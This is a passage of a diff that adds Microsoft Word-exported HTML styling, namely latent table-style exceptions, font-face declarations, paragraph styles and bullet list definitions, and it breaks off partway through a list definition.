+  <w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark"/>
+  <w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful"/>
+  <w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 1"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 1"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 1"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 1"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 1"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 1"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 2"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 2"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 2"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 2"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 2"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 2"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 3"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 3"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 3"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 3"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 3"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 3"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 4"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 4"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 4"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 4"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 4"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 4"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 5"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 5"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 5"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 5"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 5"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 5"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="Grid Table 1 Light Accent 6"/>
+  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 6"/>
+  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 6"/>
+  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 6"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="Grid Table 6 Colorful Accent 6"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="Grid Table 7 Colorful Accent 6"/>
+  <w:LsdException Locked="false" Priority="46" Name="List Table 1 Light"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark"/>
+  <w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful"/>
+  <w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 1"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 1"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 1"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 1"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 1"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 1"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 2"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 2"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 2"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 2"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 2"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 2"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 3"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 3"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 3"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 3"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 3"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 3"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 4"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 4"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 4"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 4"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 4"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 4"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 5"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 5"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 5"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 5"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 5"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 5"/>
+  <w:LsdException Locked="false" Priority="46"
+   Name="List Table 1 Light Accent 6"/>
+  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 6"/>
+  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 6"/>
+  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 6"/>
+  <w:LsdException Locked="false" Priority="51"
+   Name="List Table 6 Colorful Accent 6"/>
+  <w:LsdException Locked="false" Priority="52"
+   Name="List Table 7 Colorful Accent 6"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Mention"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Smart Hyperlink"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Hashtag"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Unresolved Mention"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Smart Link"/>
+ </w:LatentStyles>
+</xml><![endif]-->
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:Wingdings;
+	panose-1:5 0 0 0 0 0 0 0 0 0;
+	mso-font-charset:2;
+	mso-generic-font-family:auto;
+	mso-font-pitch:variable;
+	mso-font-signature:0 268435456 0 0 -2147483648 0;}
+@font-face
+	{font-family:Batang;
+	panose-1:2 3 6 0 0 1 1 1 1 1;
+	mso-font-alt:\BC14\D0D5;
+	mso-font-charset:129;
+	mso-generic-font-family:roman;
+	mso-font-pitch:variable;
+	mso-font-signature:-1342176593 1775729915 48 0 524447 0;}
+@font-face
+	{font-family:"MS Gothic";
+	panose-1:2 11 6 9 7 2 5 8 2 4;
+	mso-font-alt:"\FF2D\FF33 \30B4\30B7\30C3\30AF";
+	mso-font-charset:128;
+	mso-generic-font-family:modern;
+	mso-font-pitch:fixed;
+	mso-font-signature:-536870145 1791491579 134217746 0 131231 0;}
+@font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:roman;
+	mso-font-pitch:variable;
+	mso-font-signature:-536869121 1107305727 33554432 0 415 0;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:-469750017 -1040178053 9 0 511 0;}
+@font-face
+	{font-family:"Malgun Gothic";
+	panose-1:2 11 5 3 2 0 0 2 0 4;
+	mso-font-alt:"\B9D1\C740 \ACE0\B515";
+	mso-font-charset:129;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:-1879048145 701988091 18 0 524289 0;}
+@font-face
+	{font-family:"\@Batang";
+	panose-1:2 3 6 0 0 1 1 1 1 1;
+	mso-font-charset:129;
+	mso-generic-font-family:roman;
+	mso-font-pitch:variable;
+	mso-font-signature:-1342176593 1775729915 48 0 524447 0;}
+@font-face
+	{font-family:"\@MS Gothic";
+	panose-1:2 11 6 9 7 2 5 8 2 4;
+	mso-font-charset:128;
+	mso-generic-font-family:modern;
+	mso-font-pitch:fixed;
+	mso-font-signature:-536870145 1791491579 134217746 0 131231 0;}
+@font-face
+	{font-family:"\@Malgun Gothic";
+	mso-font-charset:129;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:-1879048145 701988091 18 0 524289 0;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-parent:"";
+	margin-top:0in;
+	margin-right:0in;
+	margin-bottom:8.0pt;
+	margin-left:0in;
+	line-height:106%;
+	mso-pagination:widow-orphan;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-fareast-font-family:Batang;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;
+	mso-fareast-language:EN-US;}
+a:link, span.MsoHyperlink
+	{mso-style-noshow:yes;
+	mso-style-priority:99;
+	color:#0563C1;
+	mso-themecolor:hyperlink;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{mso-style-noshow:yes;
+	mso-style-priority:99;
+	color:#954F72;
+	mso-themecolor:followedhyperlink;
+	text-decoration:underline;
+	text-underline:single;}
+p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
+	{mso-style-priority:34;
+	mso-style-unhide:no;
+	mso-style-qformat:yes;
+	margin-top:0in;
+	margin-right:0in;
+	margin-bottom:8.0pt;
+	margin-left:.5in;
+	mso-add-space:auto;
+	line-height:106%;
+	mso-pagination:widow-orphan;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-fareast-font-family:Batang;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;
+	mso-fareast-language:EN-US;}
+p.MsoListParagraphCxSpFirst, li.MsoListParagraphCxSpFirst, div.MsoListParagraphCxSpFirst
+	{mso-style-priority:34;
+	mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-type:export-only;
+	margin-top:0in;
+	margin-right:0in;
+	margin-bottom:0in;
+	margin-left:.5in;
+	mso-add-space:auto;
+	line-height:106%;
+	mso-pagination:widow-orphan;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-fareast-font-family:Batang;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;
+	mso-fareast-language:EN-US;}
+p.MsoListParagraphCxSpMiddle, li.MsoListParagraphCxSpMiddle, div.MsoListParagraphCxSpMiddle
+	{mso-style-priority:34;
+	mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-type:export-only;
+	margin-top:0in;
+	margin-right:0in;
+	margin-bottom:0in;
+	margin-left:.5in;
+	mso-add-space:auto;
+	line-height:106%;
+	mso-pagination:widow-orphan;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-fareast-font-family:Batang;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;
+	mso-fareast-language:EN-US;}
+p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxSpLast
+	{mso-style-priority:34;
+	mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-type:export-only;
+	margin-top:0in;
+	margin-right:0in;
+	margin-bottom:8.0pt;
+	margin-left:.5in;
+	mso-add-space:auto;
+	line-height:106%;
+	mso-pagination:widow-orphan;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-fareast-font-family:Batang;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;
+	mso-fareast-language:EN-US;}
+p.msonormal0, li.msonormal0, div.msonormal0
+	{mso-style-name:msonormal;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0in;
+	mso-margin-bottom-alt:auto;
+	margin-left:0in;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman",serif;
+	mso-fareast-font-family:"Times New Roman";
+	mso-fareast-theme-font:minor-fareast;}
+span.SpellE
+	{mso-style-name:"";
+	mso-spl-e:yes;}
+span.GramE
+	{mso-style-name:"";
+	mso-gram-e:yes;}
+.MsoChpDefault
+	{mso-style-type:export-only;
+	mso-default-props:yes;
+	font-size:10.0pt;
+	mso-ansi-font-size:10.0pt;
+	mso-bidi-font-size:10.0pt;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-fareast-font-family:Batang;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;
+	mso-font-kerning:0pt;
+	mso-ligatures:none;
+	mso-fareast-language:EN-US;}
+@page WordSection1
+	{size:8.5in 11.0in;
+	margin:.5in .5in .5in .5in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.WordSection1
+	{page:WordSection1;}
+ /* List Definitions */
+ @list l0
+	{mso-list-id:69351037;
+	mso-list-template-ids:219415034;}
+@list l0:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Symbol;}
+@list l0:level2
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:.75in;
+	mso-level-number-position:left;
+	margin-left:.75in;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:"Courier New";
+	mso-bidi-font-family:"Times New Roman";}
+@list l0:level3
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:1.25in;
+	mso-level-number-position:left;
+	margin-left:1.25in;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l0:level4
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:1.75in;
+	mso-level-number-position:left;
+	margin-left:1.75in;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l0:level5
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:2.25in;
+	mso-level-number-position:left;
+	margin-left:2.25in;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l0:level6
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:2.75in;
+	mso-level-number-position:left;
+	margin-left:2.75in;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l0:level7
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:3.25in;
+	mso-level-number-position:left;
+	margin-left:3.25in;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l0:level8
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:3.75in;
+	mso-level-number-position:left;
+	margin-left:3.75in;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l0:level9
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:4.25in;
+	mso-level-number-position:left;
+	margin-left:4.25in;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l1
+	{mso-list-id:240985642;
+	mso-list-type:hybrid;
+	mso-list-template-ids:-2126221810 67698689 67698691 67698693 67698689 67698691 67698693 67698689 67698691 67698693;}
+@list l1:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l1:level2
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l1:level3
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l1:level4
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l1:level5
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l1:level6
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l1:level7
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l1:level8
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l1:level9
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l2
+	{mso-list-id:452676025;
+	mso-list-type:hybrid;
+	mso-list-template-ids:55363460 67698689 67698691 67698693 67698689 67698691 67698693 67698689 67698691 67698693;}
+@list l2:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:.75in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l2:level2
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:1.25in;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l2:level3
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:1.75in;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l2:level4
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:2.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l2:level5
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:2.75in;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l2:level6
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:3.25in;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l2:level7
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:3.75in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l2:level8
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:4.25in;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l2:level9
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:4.75in;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l3
+	{mso-list-id:660932129;
+	mso-list-type:hybrid;
+	mso-list-template-ids:-1205542022 67698689 67698691 67698693 67698689 67698691 67698693 67698689 67698691 67698693;}
+@list l3:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:.75in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l3:level2
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:1.25in;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l3:level3
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:1.75in;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l3:level4
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:2.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l3:level5
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:2.75in;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l3:level6
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:3.25in;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l3:level7
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:3.75in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l3:level8
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:4.25in;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l3:level9
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:4.75in;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l4
+	{mso-list-id:966660258;
+	mso-list-type:hybrid;
+	mso-list-template-ids:1714312544 -355326222 67698691 67698693 67698689 67698691 67698693 67698689 67698691 67698693;}
+@list l4:level1
+	{mso-level-start-at:0;
+	mso-level-number-format:bullet;
+	mso-level-text:-;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Calibri",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+@list l4:level2
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l4:level3
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l4:level4
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l4:level5
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l4:level6
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l4:level7
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l4:level8
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l4:level9
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l5
+	{mso-list-id:1472988435;
+	mso-list-type:hybrid;
+	mso-list-template-ids:-1244863076 67698689 67698691 67698693 67698689 67698691 67698693 67698689 67698691 67698693;}
+@list l5:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l5:level2
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l5:level3
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l5:level4
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l5:level5
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l5:level6
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l5:level7
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l5:level8
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:"Courier New";}
+@list l5:level9
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	font-family:Wingdings;}
+@list l6
+	{mso-list-id:1603682852;
+	mso-list-template-ids:1715238312;}
+@list l6:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.5in;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Symbol;}
+@list l6:level2
+	{mso-level-number-format:bullet;
